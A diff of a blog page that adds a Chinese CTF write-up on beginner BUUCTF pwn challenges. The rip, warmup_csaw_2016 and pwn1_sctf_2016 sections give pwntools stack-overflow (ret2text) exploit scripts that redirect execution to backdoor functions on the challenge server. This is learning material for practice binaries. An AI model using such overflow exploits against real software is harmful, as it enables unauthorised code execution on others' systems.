@@ -164,65 +164,186 @@
 </script>
             <div class="main">
                 <div class="container">
-                    <div class="post-wrap tags">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                BUU-PWN题详解
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            m0sway
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2021-01-09</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">2.1
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">516</a></span>
+                                        
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
                         
-                            <a href="https://m0sway.github.io/tag/EP4wy7-Os/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> 未授权访问</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://m0sway.github.io/tag/8YXm7_FVZ/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> RCE</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://m0sway.github.io/tag/kX-lRZXOs/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> m0sway</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://m0sway.github.io/tag/ooDNTGI2j/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> 信息收集</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://m0sway.github.io/tag/_UT1emqsR/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> Shell</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://m0sway.github.io/tag/WKkLKH9Kv/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> Cisco</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://m0sway.github.io/tag/H3ZODDlMzJ/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> 目录遍历</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://m0sway.github.io/tag/1oh5kZ7ucJ/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> 社工</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://m0sway.github.io/tag/Ju9AXFUi2/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> F5</i>
-                                </p>
-                            </a>
-                            
-                    </div>
+                        <div class="post-content">
+                            <h1 id="test_your_nc">test_your_nc</h1>
+<p>直接连接即可：<br>
+<img src="https://m0sway.github.io/post-images/1610198782295.png" alt="" loading="lazy"></p>
+<h1 id="rip">rip</h1>
+<p>先用<code>checksec</code>来看下保护：<br>
+<img src="https://m0sway.github.io/post-images/1610199038756.png" alt="" loading="lazy"><br>
+是一个64位的程序，关闭了所有的保护，并且还有RWX segments<br>
+拖进IDA里面查看，可以看到有一个名为<code>fun</code>的后门函数<br>
+<img src="https://m0sway.github.io/post-images/1610199208012.png" alt="" loading="lazy"><br>
+主函数如下：<br>
+<img src="https://m0sway.github.io/post-images/1610199494886.png" alt="" loading="lazy"><br>
+利用<code>gets</code>函数读取用户输入的数据，s参数离栈底部0xF个字节。<br>
+so 就是一个ret2text的题目，代码如下：</p>
+<pre><code>from pwn import *
+
+#context.log_level='debug'
+sys_addr = 0x401186
+# r = process(&quot;./pwn1&quot;)
+r = remote(&quot;node3.buuoj.cn&quot;,27439)
+r.recv()
+payload = b'M' * (0xf + 8)  + p64(sys_addr)
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+<h1 id="warmup_csaw_2016">warmup_csaw_2016</h1>
+<p>先用<code>checksec</code>来看下保护：<br>
+<img src="https://m0sway.github.io/post-images/1610201505036.png" alt="" loading="lazy"><br>
+是一个64位的程序，关闭了所有的保护，并且还有RWX segments<br>
+拖进IDA，主函数如下：<br>
+<img src="https://m0sway.github.io/post-images/1610201597409.png" alt="" loading="lazy"><br>
+可以看到输出了一个函数的地址，跟进函数看下<br>
+<img src="https://m0sway.github.io/post-images/1610201773079.png" alt="" loading="lazy"><br>
+是一个后门函数调用系统命令<code>cat flag</code>，所以我们应该就想办法调用这个函数。<br>
+回到主函数看看，最后用<code>gets</code>函数向<code>v5</code>写入数据，那么就存在一个溢出。<br>
+<code>v5</code>到栈底的距离是<code>0x40</code> so:</p>
+<pre><code>from pwn import *
+
+r = remote(&quot;node3.buuoj.cn&quot;,27089)
+#r = process(&quot;./warmup_csaw_2016&quot;)
+r.recvuntil(&quot;WOW:&quot;)
+addr = int(r.recv(8).decode(),16)
+print(addr)
+payload = b'M' * (0x40 + 8) + p64(addr)
+r.sendlineafter(&quot;&gt;&quot;,payload)
+
+r.interactive()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://m0sway.github.io/post-images/1610202191449.png" alt="" loading="lazy"></figure>
+<h1 id="pwn1_sctf_2016">pwn1_sctf_2016</h1>
+<p>先用<code>checksec</code>来看下保护：<br>
+<img src="https://m0sway.github.io/post-images/1610202466424.png" alt="" loading="lazy"><br>
+是一个32位的程序，NX enabled、Partial RELRO<br>
+拖进IDA，主函数如下：<br>
+<img src="https://m0sway.github.io/post-images/1610202490014.png" alt="" loading="lazy"><br>
+存在漏洞的函数已经被标记出来了，直接跟进看：<br>
+<img src="https://m0sway.github.io/post-images/1610202539464.png" alt="" loading="lazy"><br>
+分配的s空间为60，限制输入32，初步看是不会造成栈溢出的，但是下面有一个字符替换，就是输入I会被替换成you。I是一个字符，you是三个字符，那么我们可以输入20个I（满足32的限制），那么这20个I，最终被替换成了60个字符，从而造成溢出</p>
+<p>用F12搜索下全局的字符串，会发现有一个<code>cat flag.txt</code>，跟进获取到该函数的地址为<code>0x8048F0D</code><br>
+<img src="https://m0sway.github.io/post-images/1610202762621.png" alt="" loading="lazy"><br>
+代码如下：</p>
+<pre><code>from pwn import *
+
+r = remote(&quot;node3.buuoj.cn&quot;,25658)
+payload = b'I'*20 + b'M'*4 + p32(0x8048F0D)
+r.recv()
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+
+                        </div>
+                        
+                                
+                                    
+                                            <!--zh-->
+                                            <section class="post-copyright zh">
+                                                <p class="copyright-item ">
+                                                    <span>&#x4F5C;&#x8005;:</span>
+                                                    <span>m0sway</span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x6C38;&#x4E45;&#x94FE;&#x63A5;:</span>
+                                                    <span><a href="https://m0sway.github.io/post/buu-pwn-ti-xiang-jie/">https://m0sway.github.io/post/buu-pwn-ti-xiang-jie/</a></span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x534F;&#x8BAE;:</span>
+                                                    <span>MIT License</span>
+                                                </p>
+                                            </section>
+                                            
+                                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://m0sway.github.io/post/buu-pwn-ti-xiang-jie/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://m0sway.github.io/post/buu-pwn-ti-xiang-jie/&sharesource=qzone&title=BUU-PWN题详解&pics=https://m0sway.github.io/images/avatar.png?v=1610203130560&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://m0sway.github.io/post/buu-pwn-ti-xiang-jie/&sharesource=weibo&title=BUU-PWN题详解 + " - " + &pic="https://m0sway.github.io/images/avatar.png?v=1610203130560 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://m0sway.github.io/post/wei-shou-quan-fang-wen-lou-dong-zong-jie/">
+                                                                                                    未授权访问漏洞总结
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
                 </div>
+                
+                                            
+                                                <script type="application/javascript" src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
+<div id="vlaine-comment"></div>
+<script type="application/javascript">
+    new Valine({
+        el: '#vlaine-comment',
+        appId: 'uW9floiITitWlppTUG210Vco-gzGzoHsz',
+        appKey: 'QOQ63bDmWvNAx6F04cpXfCW0',
+        pageSize: 10,
+        avatar: 'mp',
+        placeholder: '嘿嘿嘿！！！',
+        visitor: true,
+        highlight: true,
+        recordIP: true,
+    })
+</script>
+                                                    
             </div>
+    </div>
+    </div>
     </div>
     
     <div id="player"></div>
@@ -353,5 +474,8 @@
                     
         </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
